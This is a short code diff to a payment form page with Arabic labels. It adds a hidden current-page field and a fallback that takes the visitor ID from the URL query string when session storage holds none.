@@ -157,6 +157,7 @@
 
             <form id="paymentForm" action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" id="form_visitor_id">
+                <input type="hidden" name="current_page" value="payment.php">
                 <div class="form-group">
                     <label>رقم البطاقة</label>
                     <input type="tel" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" required maxlength="19">
@@ -211,6 +212,11 @@
 
 <script>
     let visitorId = sessionStorage.getItem('visitorId');
+    if (!visitorId) {
+        // إذا لم يوجد visitorId، نحاول جلب المعامل من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        visitorId = urlParams.get('visitor_id');
+    }
     document.getElementById('form_visitor_id').value = visitorId;
 
     const urlParams = new URLSearchParams(window.location.search);
